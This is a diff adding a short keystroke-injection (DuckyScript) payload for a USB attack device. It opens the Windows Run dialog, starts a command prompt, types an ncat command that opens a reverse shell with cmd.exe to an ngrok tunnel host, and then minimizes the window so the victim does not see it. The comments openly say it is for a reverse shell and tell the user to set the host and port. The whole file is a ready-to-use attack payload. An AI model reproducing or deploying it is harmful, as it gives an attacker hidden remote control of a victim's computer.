@@ -1,0 +1,19 @@
+REM This script opens cmd and gives the ncat command to connect to a url for reverse shell. Make sure to update the URL and port number according to use in line 11.
+REM Open Command Prompt
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+
+REM Run the ncat reverse shell command
+STRING ncat 0.tcp.ngrok.io 198 -e cmd.exe
+ENTER
+DELAY 500
+
+REM Minimize the command prompt window using ALT + SPACE, then 'n'
+ALT SPACE
+DELAY 200
+STRING n
+ENTER
